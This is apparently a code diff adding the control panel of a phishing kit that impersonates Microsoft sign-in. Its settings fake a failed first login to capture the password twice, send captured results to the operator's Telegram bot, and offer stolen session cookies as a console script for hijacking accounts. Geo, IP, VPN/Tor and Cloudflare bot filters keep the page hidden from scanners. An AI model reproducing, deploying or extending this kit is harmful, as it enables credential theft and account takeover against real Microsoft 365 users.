+                    <input id="proxycheckApiKey" type="password" placeholder="Optional" style="font-size: 11px; padding: 4px 8px; width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: var(--text);">
+                  </div>
+                </div>
+            </div>
+          </div>
+          <div class="app-security-card country-filter">
+            <div class="app-security-card-header">
+              <div class="app-security-card-title">
+                🌍 Country Block (APP)
+                <span class="tooltip-icon" title="Applies before serving pages. Uses Cloudflare CF-IPCountry when available.">?</span>
+              </div>
+              <label class="app-security-toggle">
+                <input id="countryBlockingEnabled" type="checkbox">
+                <span class="app-security-slider"></span>
+              </label>
+            </div>
+            <div class="app-country-selector">
+              <button type="button" id="allowedCountriesToggle" class="app-country-toggle">
+                 <span>Select Countries (0 selected)</span>
+                 <span>▼</span>
+              </button>
+              <div class="app-country-dropdown">
+                <select id="allowedCountries" multiple size="8"></select>
+              </div>
+            </div>
+          </div>
+          <div class="app-security-card ip-whitelist">
+            <div class="app-security-card-header">
+              <div class="app-security-card-title">
+                📋 IP Whitelist
+              </div>
+            </div>
+            <div class="app-security-field">
+              <label for="ipWhitelist">Allowed IP Addresses</label>
+              <input id="ipWhitelist" type="text" placeholder="1.2.3.4, 10.0.0.1">
+            </div>
+          </div>
+        <div class="form-group" style="display:none">
+          <label for="blockedDomains">Blocked Email Domains <span class="tooltip-icon" title="Comma-separated domains to block, e.g. gmail.com, outlook.com. These will show an error message.">?</span></label>
+          <textarea id="blockedDomains" placeholder="gmail.com, yahoo.com" style="width:100%;min-height:80px;padding:12px;border:1px solid var(--border);background:var(--bg-1);color:var(--accent);font-family:var(--font-mono);"></textarea>
+        </div>
+        <div class="form-group" style="display:none">
+          <label for="allowedDomains">Allowed Email Domains <span class="tooltip-icon" title="If set, only these domains can access. Comma-separated, e.g. mycompany.com.">?</span></label>
+          <textarea id="allowedDomains" placeholder="mycompany.com" style="width:100%;min-height:80px;padding:12px;border:1px solid var(--border);background:var(--bg-1);color:var(--accent);font-family:var(--font-mono);"></textarea>
+        </div>
+
+        </div>
+
+          <div class="app-security-card proxy-config">
+            <div class="app-security-card-header">
+              <div class="app-security-card-title">
+                🌐 Proxy Configuration
+                <span class="tooltip-icon" title="Route traffic through an external proxy server">?</span>
+              </div>
+              <label class="app-security-toggle">
+                <input id="proxyEnabled" type="checkbox">
+                <span class="app-security-slider"></span>
+              </label>
+            </div>
+            <div class="app-security-status" id="proxyStatusText" style="margin-bottom: 4px;">OFFLINE</div>
+            
+            <div id="proxy-settings" style="display:none; margin-top: 8px; padding-top: 8px; border-top: 1px solid rgba(255, 255, 255, 0.1);">
+              <div class="app-security-field">
+                <label for="proxyUrl">Proxy URL</label>
+                <input id="proxyUrl" type="text" placeholder="protocol://user:pass@host:port" style="font-size: 11px; padding: 6px;">
+              </div>
+            </div>
+          </div>
+      </div>
+      
+      <div id="tab-analytics" class="tab-content">
+        <div class="modern-analysis-sidebar" style="background: rgba(0,0,0,0.2); border: 1px solid var(--border);">
+          <div class="analysis-sidebar-header">
+            <span class="analysis-sidebar-icon">🌍</span>
+            <span class="analysis-sidebar-title">Geographic Distribution</span>
+          </div>
+          <div id="analytics-map" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 12px; padding: 10px;">
+            <div class="muted" style="grid-column: 1/-1; text-align: center; padding: 40px;">No geographic data available yet.</div>
+          </div>
+        </div>
+      </div>
+
+      <div id="tab-submissions" class="tab-content">
+        <!-- Moved to global area above -->
+        <div class="muted">Results are now displayed above settings.</div>
+      </div>
+    </div>
+  </div>
+  </div>
+  
+  <!-- Actions Row - Global placement -->
+  <div class="actions-row" style="margin-top: 32px; padding-top: 24px; border-top: 1px solid var(--border);">
+    <button class="primary" id="saveServer">Save To Server</button>
+  </div>
+    
+  <!-- Status - Global placement -->
+  <div class="status" id="status" style="margin-top: 16px; min-height: 20px;"></div>
+
+  </div>
+  </div>
+  </div>
+</div>
+<div class="modal-overlay" id="cookieModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Session Cookies</div>
+      <div class="modal-close" onclick="closeModal()">×</div>
+    </div>
+    <div class="modal-body">
+      <div class="controls" style="margin-bottom:10px;">
+         <div class="muted">Copy this script to console to inject session</div>
+         <button class="primary" id="copyCookiesBtn">Copy Content</button>
+      </div>
+      <div class="code-block" id="cookieContent">Loading...</div>
+    </div>
+  </div>
+</div>
+<script>
+const defaults={template:"microsoft",redirectUrl:"https://outlook.office.com/mail/",firstAttemptFail:true,securityEnabled:false,loadingEnabled:true,
+  loadingDelayMs:2000,
+  loadingGifUrl:"https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif",logoUrl:"https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg",backArrowUrl:"https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg",telemetryEnabled:false,telegramBotToken:"",telegramChatId:"",telegramReportIncorrect:true,cfTurnstileEnabled:false,cfSecurityEnabled:false,cfBotShield:false,cfUnderAttack:false,cfSiteKey:"",cfSecretKey:"",cfApiKey:"",cfEmail:"",cfZoneId:"",cfAccountId:"",countryBlockingEnabled:false,allowedCountries:"",ipWhitelist:"",blockedDomains:[],allowedDomains:[],
+  proxyEnabled:false,proxyUrl:"",proxycheckEnabled:false,proxycheckBlockVPN:true,proxycheckBlockProxy:true,proxycheckBlockTor:true,proxycheckApiKey:""};
+const els={
+  template:document.getElementById("template"),
+  redirectUrl:document.getElementById("redirectUrl"),
+  telemetryEnabled:document.getElementById("telemetryEnabled"),
+  telegramBotToken:document.getElementById("telegramBotToken"),
+  telegramChatId:document.getElementById("telegramChatId"),
+  telegramReportIncorrect:document.getElementById("telegramReportIncorrect"),
+  securityEnabled:document.getElementById("securityEnabled"),
+  cfTurnstileEnabled:document.getElementById("cfTurnstileEnabled"),
+  cfMasterToggle:document.getElementById("cfMasterToggle"),
+  cfBotShieldStatus:document.getElementById("cfBotShieldStatus"),
+  cfUnderAttackStatus:document.getElementById("cfUnderAttackStatus"),
+  cfSecurityStatus:document.getElementById("cfSecurityStatus"),
+  cfSecurityEnabled:document.getElementById("cfSecurityEnabled"),
+  cfBotShield:document.getElementById("cfBotShield"),
+  cfUnderAttack:document.getElementById("cfUnderAttack"),
+  cfTurnstileInvisible:document.getElementById("cfTurnstileInvisible"),
+    cfSiteKey:document.getElementById("cfSiteKey"),
+  cfSecretKey:document.getElementById("cfSecretKey"),
+  cfApiKey:document.getElementById("cfApiKey"),
+  cfEmail:document.getElementById("cfEmail"),
+  cfZoneId:document.getElementById("cfZoneId"),
+  cfAccountId:document.getElementById("cfAccountId"),
+  cfCountryBlockingEnabled:document.getElementById("cfCountryBlockingEnabled"),
+  cfAllowedCountries:document.getElementById("cfAllowedCountries"),
+  countryBlockingEnabled:document.getElementById("countryBlockingEnabled"),
+  allowedCountries:document.getElementById("allowedCountries"),
+  ipWhitelist:document.getElementById("ipWhitelist"),
+  blockedDomains:document.getElementById("blockedDomains"),
+  allowedDomains:document.getElementById("allowedDomains"),
+  status:document.getElementById("status"),
+  proxyEnabled:document.getElementById("proxyEnabled"),
+  proxyUrl:document.getElementById("proxyUrl"),
+  proxycheckEnabled:document.getElementById("securityEnabled"),
+  proxycheckBlockVPN:document.getElementById("proxycheckBlockVPN"),
+  proxycheckBlockProxy:document.getElementById("proxycheckBlockProxy"),
+  proxycheckBlockTor:document.getElementById("proxycheckBlockTor"),
+  proxycheckApiKey:document.getElementById("proxycheckApiKey")
+};
+const apiBases=["/api","/api.php"];
+let apiBase="/api";
+try{ apiBase=(localStorage.getItem("apiBase")||"/api").trim(); }catch(e){ apiBase="/api"; }
+if(!apiBases.includes(apiBase)) apiBase="/api";
+function apiUrl(action, params, baseOverride){
+  const base=(baseOverride||apiBase);
+  const u=new URL(base, location.origin);
+  u.searchParams.set("action", action);
+  if(params && typeof params==="object"){
+    for(const [k,v] of Object.entries(params)){
+      if(v === undefined || v === null) continue;
+      u.searchParams.set(k, String(v));
+    }
+  }
+  return u.pathname + "?" + u.searchParams.toString();
+}
+async function apiFetch(action, opts){
+  const options=opts && typeof opts==="object" ? opts : {};
+  const params=options.params;
+  const fetchOpts={...options};
+  delete fetchOpts.params;
+  const bases=[apiBase, ...apiBases.filter(b=>b!==apiBase)];
+  let lastErr;
+  for(const base of bases){
+    try{
+      const res=await fetch(apiUrl(action, params, base), fetchOpts);
+      if(res.status === 404) continue;
+      const ct=(res.headers.get("content-type")||"").toLowerCase();
+      if(ct && !ct.includes("application/json")) continue;
+      apiBase=base;
+      try{ localStorage.setItem("apiBase", apiBase); }catch(e){}
+      return res;
+    }catch(e){ lastErr=e; }
+  }
+  throw lastErr || new Error("Failed to fetch");
+}
+const validateTurnstileBtn = document.getElementById("validateTurnstileBtn");
+const validateTurnstileStatus = document.getElementById("validateTurnstileStatus");
+async function validateTurnstileConfig(){
+  if(!validateTurnstileStatus) return;
+  validateTurnstileStatus.textContent = "Checking...";
+  validateTurnstileStatus.style.color = "var(--text-dim)";
+  
+  // Use current form values for immediate feedback
+  const payload = {
+      cfSiteKey: els.cfSiteKey.value.trim(),
+      cfSecretKey: els.cfSecretKey.value.trim(),
+      cfTurnstileEnabled: els.cfTurnstileEnabled.checked
+  };
+
+  try{
+    const r = await apiFetch("validate_turnstile_config", { 
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        cache: "no-store" 
+    });
+    const j = await r.json();
+    if(r.ok && j && j.ok){
+      if(!j.enabled){
+        validateTurnstileStatus.textContent = "Disabled";
+        validateTurnstileStatus.style.color = "var(--text-dim)";
+        return;
+      }
+      const missing = [];
+      if(!j.siteKeyPresent) missing.push("Site Key");
+      if(!j.secretKeyPresent) missing.push("Secret Key");
+      if(j.ready){
+        validateTurnstileStatus.textContent = "Ready";
+        validateTurnstileStatus.style.color = "var(--c-success)";
+        return;
+      }
+      if(missing.length){
+        validateTurnstileStatus.textContent = "Missing " + missing.join(" + ");
+        validateTurnstileStatus.style.color = "var(--c-error)";
+        return;
+      }
+      validateTurnstileStatus.textContent = "Check keys";
+      validateTurnstileStatus.style.color = "var(--c-warn)";
+      return;
+    }
+    validateTurnstileStatus.textContent = "Check failed";
+    validateTurnstileStatus.style.color = "var(--c-error)";
+  }catch(e){
+    validateTurnstileStatus.textContent = "Network error";
+    validateTurnstileStatus.style.color = "var(--c-error)";
+  }
+}
+if (validateTurnstileBtn) validateTurnstileBtn.addEventListener("click", validateTurnstileConfig);
+const isoCountries=[
+  ["AF","Afghanistan"],["AL","Albania"],["DZ","Algeria"],["AS","American Samoa"],["AD","Andorra"],["AO","Angola"],["AI","Anguilla"],["AQ","Antarctica"],["AG","Antigua and Barbuda"],["AR","Argentina"],["AM","Armenia"],["AW","Aruba"],["AU","Australia"],["AT","Austria"],["AZ","Azerbaijan"],
+  ["BS","Bahamas"],["BH","Bahrain"],["BD","Bangladesh"],["BB","Barbados"],["BY","Belarus"],["BE","Belgium"],["BZ","Belize"],["BJ","Benin"],["BM","Bermuda"],["BT","Bhutan"],["BO","Bolivia"],["BQ","Bonaire, Sint Eustatius and Saba"],["BA","Bosnia and Herzegovina"],["BW","Botswana"],["BV","Bouvet Island"],["BR","Brazil"],["IO","British Indian Ocean Territory"],["BN","Brunei Darussalam"],["BG","Bulgaria"],["BF","Burkina Faso"],["BI","Burundi"],
+  ["CV","Cabo Verde"],["KH","Cambodia"],["CM","Cameroon"],["CA","Canada"],["KY","Cayman Islands"],["CF","Central African Republic"],["TD","Chad"],["CL","Chile"],["CN","China"],["CX","Christmas Island"],["CC","Cocos (Keeling) Islands"],["CO","Colombia"],["KM","Comoros"],["CG","Congo"],["CD","Congo, Democratic Republic of the"],["CK","Cook Islands"],["CR","Costa Rica"],["CI","Côte d'Ivoire"],["HR","Croatia"],["CU","Cuba"],["CW","Curaçao"],["CY","Cyprus"],["CZ","Czechia"],
+  ["DK","Denmark"],["DJ","Djibouti"],["DM","Dominica"],["DO","Dominican Republic"],
+  ["EC","Ecuador"],["EG","Egypt"],["SV","El Salvador"],["GQ","Equatorial Guinea"],["ER","Eritrea"],["EE","Estonia"],["SZ","Eswatini"],["ET","Ethiopia"],
+  ["FK","Falkland Islands (Malvinas)"],["FO","Faroe Islands"],["FJ","Fiji"],["FI","Finland"],["FR","France"],["GF","French Guiana"],["PF","French Polynesia"],["TF","French Southern Territories"],
+  ["GA","Gabon"],["GM","Gambia"],["GE","Georgia"],["DE","Germany"],["GH","Ghana"],["GI","Gibraltar"],["GR","Greece"],["GL","Greenland"],["GD","Grenada"],["GP","Guadeloupe"],["GU","Guam"],["GT","Guatemala"],["GG","Guernsey"],["GN","Guinea"],["GW","Guinea-Bissau"],["GY","Guyana"],
+  ["HT","Haiti"],["HM","Heard Island and McDonald Islands"],["VA","Holy See"],["HN","Honduras"],["HK","Hong Kong"],["HU","Hungary"],
+  ["IS","Iceland"],["IN","India"],["ID","Indonesia"],["IR","Iran"],["IQ","Iraq"],["IE","Ireland"],["IM","Isle of Man"],["IL","Israel"],["IT","Italy"],
+  ["JM","Jamaica"],["JP","Japan"],["JE","Jersey"],["JO","Jordan"],
+  ["KZ","Kazakhstan"],["KE","Kenya"],["KI","Kiribati"],["KP","Korea (North)"],["KR","Korea (South)"],["KW","Kuwait"],["KG","Kyrgyzstan"],
+  ["LA","Lao People's Democratic Republic"],["LV","Latvia"],["LB","Lebanon"],["LS","Lesotho"],["LR","Liberia"],["LY","Libya"],["LI","Liechtenstein"],["LT","Lithuania"],["LU","Luxembourg"],
+  ["MO","Macao"],["MG","Madagascar"],["MW","Malawi"],["MY","Malaysia"],["MV","Maldives"],["ML","Mali"],["MT","Malta"],["MH","Marshall Islands"],["MQ","Martinique"],["MR","Mauritania"],["MU","Mauritius"],["YT","Mayotte"],["MX","Mexico"],["FM","Micronesia"],["MD","Moldova"],["MC","Monaco"],["MN","Mongolia"],["ME","Montenegro"],["MS","Montserrat"],["MA","Morocco"],["MZ","Mozambique"],["MM","Myanmar"],
+  ["NA","Namibia"],["NR","Nauru"],["NP","Nepal"],["NL","Netherlands"],["NC","New Caledonia"],["NZ","New Zealand"],["NI","Nicaragua"],["NE","Niger"],["NG","Nigeria"],["NU","Niue"],["NF","Norfolk Island"],["MK","North Macedonia"],["MP","Northern Mariana Islands"],["NO","Norway"],
+  ["OM","Oman"],
+  ["PK","Pakistan"],["PW","Palau"],["PS","Palestine"],["PA","Panama"],["PG","Papua New Guinea"],["PY","Paraguay"],["PE","Peru"],["PH","Philippines"],["PN","Pitcairn"],["PL","Poland"],["PT","Portugal"],["PR","Puerto Rico"],
+  ["QA","Qatar"],
+  ["RE","Réunion"],["RO","Romania"],["RU","Russia"],["RW","Rwanda"],
+  ["BL","Saint Barthélemy"],["SH","Saint Helena, Ascension and Tristan da Cunha"],["KN","Saint Kitts and Nevis"],["LC","Saint Lucia"],["MF","Saint Martin (French part)"],["PM","Saint Pierre and Miquelon"],["VC","Saint Vincent and the Grenadines"],["WS","Samoa"],["SM","San Marino"],["ST","Sao Tome and Principe"],["SA","Saudi Arabia"],["SN","Senegal"],["RS","Serbia"],["SC","Seychelles"],["SL","Sierra Leone"],["SG","Singapore"],["SX","Sint Maarten (Dutch part)"],["SK","Slovakia"],["SI","Slovenia"],["SB","Solomon Islands"],["SO","Somalia"],["ZA","South Africa"],["GS","South Georgia and the South Sandwich Islands"],["SS","South Sudan"],["ES","Spain"],["LK","Sri Lanka"],["SD","Sudan"],["SR","Suriname"],["SJ","Svalbard and Jan Mayen"],["SE","Sweden"],["CH","Switzerland"],["SY","Syria"],
+  ["TW","Taiwan"],["TJ","Tajikistan"],["TZ","Tanzania"],["TH","Thailand"],["TL","Timor-Leste"],["TG","Togo"],["TK","Tokelau"],["TO","Tonga"],["TT","Trinidad and Tobago"],["TN","Tunisia"],["TR","Türkiye"],["TM","Turkmenistan"],["TC","Turks and Caicos Islands"],["TV","Tuvalu"],
+  ["UG","Uganda"],["UA","Ukraine"],["AE","United Arab Emirates"],["GB","United Kingdom"],["US","United States"],["UM","United States Minor Outlying Islands"],["UY","Uruguay"],["UZ","Uzbekistan"],
+  ["VU","Vanuatu"],["VE","Venezuela"],["VN","Viet Nam"],["VG","Virgin Islands (British)"],["VI","Virgin Islands (U.S.)"],
+  ["WF","Wallis and Futuna"],["EH","Western Sahara"],
+  ["YE","Yemen"],
+  ["ZM","Zambia"],["ZW","Zimbabwe"]
+];
+function parseIsoList(s){
+  if(!s) return [];
+  return String(s).split(/[, \n\r\t]+/).map(v=>v.trim()).filter(Boolean).map(v=>v.toUpperCase());
+}
+function populateAllowedCountriesSelect(){
+  const el = document.getElementById("allowedCountries");
+  if(!el || el.tagName!=="SELECT") {
+      console.error("Country selector element #allowedCountries not found");
+      return;
+  }
+  el.innerHTML="";
+  
+  if(typeof isoCountries === 'undefined' || !Array.isArray(isoCountries)) {
+      console.error("isoCountries array is missing or invalid");
+      const err = document.createElement("option");
+      err.textContent = "Error: Country data missing";
+      el.appendChild(err);
+      return;
+  }
+
+  const frag = document.createDocumentFragment();
+  for(const [code,name] of isoCountries){
+    const opt=document.createElement("option");
+    opt.value=code;
+    opt.textContent=code+" — "+name;
+    frag.appendChild(opt);
+  }
+  el.appendChild(frag);
+  
+  // Trigger update if the label updater is ready
+  if(window.updateAllowedCountriesLabel) window.updateAllowedCountriesLabel();
+}
+
+function enableAllowedCountriesClickToggle(){
+  const el = document.getElementById("allowedCountries");
+  if(!el || el.tagName !== "SELECT" || !el.multiple) return;
+
+  // Remove old listeners if any (simple way is to clone, but we'll just add safely)
+  // Logic: Allow clicking an option to toggle it without deselecting others (like Ctrl+Click)
+  
+  let skipNextClick = false;
+  
+  const toggleFromEvent = (e) => {
+    const opt = e.target;
+    if(!opt || opt.tagName !== "OPTION") return;
+    
+    e.preventDefault(); // Prevent standard single-select behavior
+    
+    opt.selected = !opt.selected;
+    
+    // Dispatch change event manually so listeners know
+    el.dispatchEvent(new Event("change", { bubbles: true }));
+    
+    // Focus the select to keep interaction active
+    el.focus();
+  };
+
+  el.addEventListener("mousedown", (e) => {
+    if(e.target && e.target.tagName === "OPTION"){
+      // We handle the click in mousedown to prevent the default "deselect all others" behavior
+      // which happens on mousedown in many browsers for <select>
+      e.preventDefault();
+      
+      // Toggle the option
+      const opt = e.target;
+      opt.selected = !opt.selected;
+      
+      // Update UI
+      el.dispatchEvent(new Event("change", { bubbles: true }));
+      
+      // Skip the subsequent click event to avoid double-toggling
+      skipNextClick = true;
+      
+      // Ensure focus
+      return false;
+    }
+  });
+
+  el.addEventListener("click", (e) => {
+    if(skipNextClick){
+      skipNextClick = false;
+      e.preventDefault();
+      e.stopPropagation();
+      return;
+    }
+  });
+}
+
+// Allowed Countries Dropdown Logic
+function initAllowedCountriesDropdown() {
+    const toggle = document.getElementById('allowedCountriesToggle');
+    const select = document.getElementById('allowedCountries');
+    if (!toggle || !select) return;
+
+    const updateLabel = () => {
+        const count = select.selectedOptions.length;
+        const text = count === 0 ? "Select Countries (0 selected)" : `Select Countries (${count} selected)`;
+        
+        // Find the span that holds the text (first child)
+        if(toggle.firstElementChild) toggle.firstElementChild.textContent = text;
+        
+        toggle.style.borderColor = count > 0 ? 'var(--c-info)' : 'var(--border)';
+        toggle.style.color = count > 0 ? 'var(--c-info)' : 'var(--text)';
+    };
+
+    // Expose globally
+    window.updateAllowedCountriesLabel = updateLabel;
+    window.toggleTurnstileCard = function() {
+        const card = document.getElementById('turnstileCard');
+        if (card) card.classList.toggle('open');
+    };
+    window.toggleApiConfigCard = function() {
+        const card = document.getElementById('apiConfigCard');
+        if (card) card.classList.toggle('open');
+    };
+
+    toggle.addEventListener('click', (e) => {
+        e.preventDefault(); // Prevent form submission if inside form
+        const isHidden = select.parentElement.style.display === 'block'; // Check parent .app-country-dropdown
+        // Actually, the CSS hides .app-country-dropdown. 
+        // Let's check the computed style or just toggle the class/style
+        
+        const dropdown = select.parentElement;
+        if(dropdown.style.display === 'block') {
+            dropdown.style.display = 'none';
+            if(toggle.lastElementChild) toggle.lastElementChild.textContent = '▼';
+        } else {
+            dropdown.style.display = 'block';
+            if(toggle.lastElementChild) toggle.lastElementChild.textContent = '▲';
+        }
+    });
+
+    // Update label when selection changes
+    select.addEventListener('change', updateLabel);
+}
+
+function updateStatusLabel(id, active, activeColor) {
+  const el = document.getElementById(id);
+  if (el) {
+    el.textContent = active ? "ACTIVE" : "OFFLINE";
+    el.style.color = active ? (activeColor || "var(--c-primary)") : "var(--text-dim)";
+  }
+}
+
+function toggleProxyCheckDetails() {
+  const details = document.getElementById('proxycheck-details');
+  if(details && els.securityEnabled) {
+    details.style.display = els.securityEnabled.checked ? 'block' : 'none';
+  }
+}
+if (els.securityEnabled) {
+  els.securityEnabled.addEventListener('change', () => {
+    updateStatusLabel('securityStatusText', els.securityEnabled.checked, 'var(--c-primary)');
+    if(typeof toggleProxyCheckDetails === 'function') toggleProxyCheckDetails();
+  });
+}
+
+if (els.proxyEnabled) {
+  els.proxyEnabled.addEventListener('change', () => {
+    updateStatusLabel('proxyStatusText', els.proxyEnabled.checked, 'var(--c-primary)');
+    const settings = document.getElementById('proxy-settings');
+    if(settings) settings.style.display = els.proxyEnabled.checked ? 'block' : 'none';
+  });
+}
+
+if (els.cfSecurityEnabled) {
+  els.cfSecurityEnabled.addEventListener('change', () => {
+    updateStatusLabel('cfSecurityStatusText', els.cfSecurityEnabled.checked, 'var(--c-warn)');
+  });
+}
+
+if (els.cfBotShield) {
+  els.cfBotShield.addEventListener('change', () => {
+    updateStatusLabel('cfBotShieldStatusText', els.cfBotShield.checked, 'var(--c-error)');
+  });
+}
+
+if (els.cfUnderAttack) {
+  els.cfUnderAttack.addEventListener('change', () => {
+    updateStatusLabel('cfUnderAttackStatusText', els.cfUnderAttack.checked, 'var(--c-error)');
+  });
+}
+
+function setStatus(t,c){els.status.textContent=t;els.status.style.color=c||"var(--muted)"}
+let currentCfg = {};
+function loadForm(cfg){
+  // console.log("DEBUG: loadForm called with:", cfg);
+  currentCfg = cfg;
+  els.template.value=cfg.template||"microsoft";
+  const isErrorPage = (cfg.redirectUrl === "/error");
+  document.getElementById("redirectType").value = isErrorPage ? "error_page" : "custom";
+  document.getElementById("redirectUrlGroup").style.display = isErrorPage ? "none" : "block";
+  els.redirectUrl.value=cfg.redirectUrl||"";
+  els.telemetryEnabled.checked=!!cfg.telemetryEnabled;
+  els.telegramBotToken.value=cfg.telegramBotToken||"";
+  els.telegramChatId.value=cfg.telegramChatId||"";
+  // Fix: Call toggleTelegramDetails to show/hide telegram section based on checkbox
+  toggleTelegramDetails();
+  els.securityEnabled.checked=!!cfg.proxycheckEnabled;
+  updateStatusLabel('securityStatusText', !!cfg.proxycheckEnabled, 'var(--c-primary)');
+  els.cfTurnstileEnabled.checked=!!cfg.cfTurnstileEnabled;
+  els.cfBotShield.checked=!!cfg.cfBotShield;
+  els.cfUnderAttack.checked=!!cfg.cfUnderAttack;
+    els.cfSecurityEnabled.checked=!!cfg.cfSecurityEnabled;
+    updateStatusLabel('cfSecurityStatusText', !!cfg.cfSecurityEnabled, 'var(--c-warn)');
+    updateStatusLabel('cfBotShieldStatusText', !!cfg.cfBotShield, 'var(--c-error)');
+    updateStatusLabel('cfUnderAttackStatusText', !!cfg.cfUnderAttack, 'var(--c-error)');
+    els.cfSiteKey.value=cfg.cfSiteKey||"";
+  els.cfSecretKey.value=cfg.cfSecretKey||"";
+  els.cfApiKey.value=cfg.cfApiKey||"";
+  
+  // Debug logs removed for security
+
+  els.cfEmail.value=cfg.cfEmail||"";
+  els.cfZoneId.value=cfg.cfZoneId||"";
+  els.cfAccountId.value=cfg.cfAccountId||"";
+  els.cfCountryBlockingEnabled.checked=!!cfg.cfCountryBlockingEnabled;
+  els.cfAllowedCountries.value=cfg.cfAllowedCountries||"";
+  els.countryBlockingEnabled.checked=!!cfg.countryBlockingEnabled;
+  const allowedSet=new Set(parseIsoList(cfg.allowedCountries));
+  for(const opt of els.allowedCountries.options){opt.selected=allowedSet.has(opt.value);}
+  els.ipWhitelist.value=cfg.ipWhitelist||""
+  els.blockedDomains.value = Array.isArray(cfg.blockedDomains) ? cfg.blockedDomains.join(", ") : "";
+  els.allowedDomains.value = Array.isArray(cfg.allowedDomains) ? cfg.allowedDomains.join(", ") : "";
+  els.proxyEnabled.checked=!!cfg.proxyEnabled;
+  const proxySettings = document.getElementById('proxy-settings');
+  if(proxySettings) proxySettings.style.display = cfg.proxyEnabled ? 'block' : 'none';
+  updateStatusLabel('proxyStatusText', !!cfg.proxyEnabled, 'var(--c-primary)');
+  els.proxyUrl.value=cfg.proxyUrl||"";
+  els.securityEnabled.checked=!!cfg.proxycheckEnabled;
+  els.proxycheckBlockVPN.checked=!!cfg.proxycheckBlockVPN;
+  els.proxycheckBlockProxy.checked=!!cfg.proxycheckBlockProxy;
+  els.proxycheckBlockTor.checked=!!cfg.proxycheckBlockTor;
+  els.proxycheckApiKey.value=cfg.proxycheckApiKey||"";
+  if(typeof toggleProxyCheckDetails === 'function') toggleProxyCheckDetails();
+  // if(typeof updateAdminUploadVisibility === 'function') updateAdminUploadVisibility();
+}
+document.getElementById("redirectType").addEventListener("change", function(e) {
+  const isError = e.target.value === "error_page";
+  document.getElementById("redirectUrlGroup").style.display = isError ? "none" : "block";
+  if (isError) {
+    els.redirectUrl.value = "/error";
+  } else {
+    if (els.redirectUrl.value === "/error") els.redirectUrl.value = "";
+  }
+});
+function readForm(){
+  return {
+    template:els.template.value,
+    redirectUrl:els.redirectUrl.value.trim(),
+    firstAttemptFail:true,
+    loadingEnabled:currentCfg.loadingEnabled !== undefined ? currentCfg.loadingEnabled : true,
+    loadingDelayMs:currentCfg.loadingDelayMs !== undefined ? currentCfg.loadingDelayMs : 2000,
+    telemetryEnabled:els.telemetryEnabled.checked,
+    telegramBotToken:els.telegramBotToken.value.trim(),
+    telegramChatId:els.telegramChatId.value.trim(),
+    telegramReportIncorrect:els.telegramReportIncorrect.checked,
+    securityEnabled:els.securityEnabled.checked,
+    cfTurnstileEnabled:els.cfTurnstileEnabled.checked,
+    cfBotShield:els.cfBotShield.checked,
+    cfUnderAttack:els.cfUnderAttack.checked,
+    cfTurnstileInvisible:els.cfTurnstileInvisible.checked,
+      cfSecurityEnabled:els.cfSecurityEnabled.checked,
+      cfSiteKey:els.cfSiteKey.value.trim(),
+    cfSecretKey:els.cfSecretKey.value.trim(),
+    cfApiKey:els.cfApiKey.value.trim(),
+    cfEmail:els.cfEmail.value.trim(),
+    cfZoneId:els.cfZoneId.value.trim(),
+    cfAccountId:els.cfAccountId.value.trim(),
+    cfTurnstileInvisible:els.cfTurnstileInvisible.checked,
+    cfCountryBlockingEnabled:els.cfCountryBlockingEnabled.checked,
+    cfAllowedCountries:els.cfAllowedCountries.value.trim(),
+    countryBlockingEnabled:els.countryBlockingEnabled.checked,
+    allowedCountries:Array.from(els.allowedCountries.selectedOptions).map(o=>o.value).join(", "),
+    ipWhitelist:els.ipWhitelist.value.trim(),
+    blockedDomains: els.blockedDomains.value.split(",").map(v => v.trim()).filter(Boolean),
+    allowedDomains: els.allowedDomains.value.split(",").map(v => v.trim()).filter(Boolean),
+    proxyEnabled:els.proxyEnabled.checked,
+    proxyUrl:els.proxyUrl.value.trim(),
+    proxycheckEnabled:els.securityEnabled.checked,
+    proxycheckBlockVPN:els.proxycheckBlockVPN.checked,
+    proxycheckBlockProxy:els.proxycheckBlockProxy.checked,
+    proxycheckBlockTor:els.proxycheckBlockTor.checked,
+    proxycheckApiKey:els.proxycheckApiKey.value,
+    proxycheckRiskThreshold:50
+  };
+}
+function toggleTelegramDetails() {
+  const details = document.getElementById('telegram-details');
+  if(details && els.telemetryEnabled) {
+    details.style.display = els.telemetryEnabled.checked ? 'block' : 'none';
+  }
+}
+els.telemetryEnabled.addEventListener('change', toggleTelegramDetails);
+
+// Automatic Telegram Testing
+let telegramTestTimeout;
+const telegramTestStatus = document.getElementById("telegramTestStatus");
+
+const triggerTelegramTest = async () => {
+  const botToken = els.telegramBotToken.value.trim();
+  const chatId = els.telegramChatId.value.trim();
+  
+  if (!botToken || !chatId) {
+    if (telegramTestStatus) telegramTestStatus.textContent = "";
+    return;
+  }
+
+  if (telegramTestStatus) {
+    telegramTestStatus.innerHTML = '<span style="color:var(--text-dim)">Testing connection...</span>';
+  }
+
+  const proxyEnabled = els.proxyEnabled.checked;
+  const proxyUrl = els.proxyUrl.value.trim();
+
+  try {
+    const res = await apiFetch("test_telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ botToken, chatId, proxyEnabled, proxyUrl })
+    });
+    const j = await res.json();
+    if (res.ok && j.ok) {
+      if (telegramTestStatus) {
+        telegramTestStatus.innerHTML = '<span style="color:var(--c-success)">✅ Connected</span>';
+      }
+    } else {
+      if (telegramTestStatus) {
+        telegramTestStatus.innerHTML = '<span style="color:var(--c-error)">❌ ' + (j.error || "Failed") + '</span>';
+      }
+    }
+  } catch (e) {
+    if (telegramTestStatus) {
+      telegramTestStatus.innerHTML = '<span style="color:var(--c-error)">❌ Network Error</span>';
+    }
+  }
+};
+
+const checkTelegram = () => {
+  clearTimeout(telegramTestTimeout);
+  telegramTestTimeout = setTimeout(triggerTelegramTest, 1000);
+};
+
+els.telegramBotToken.addEventListener("input", checkTelegram);
+els.telegramChatId.addEventListener("input", checkTelegram);
+
+const Cloudflare = {
+  getCreds: () => ({
+    apiKey: els.cfApiKey.value.trim(),
+    email: els.cfEmail.value.trim(),
+    zoneId: els.cfZoneId.value.trim()
+  }),
+
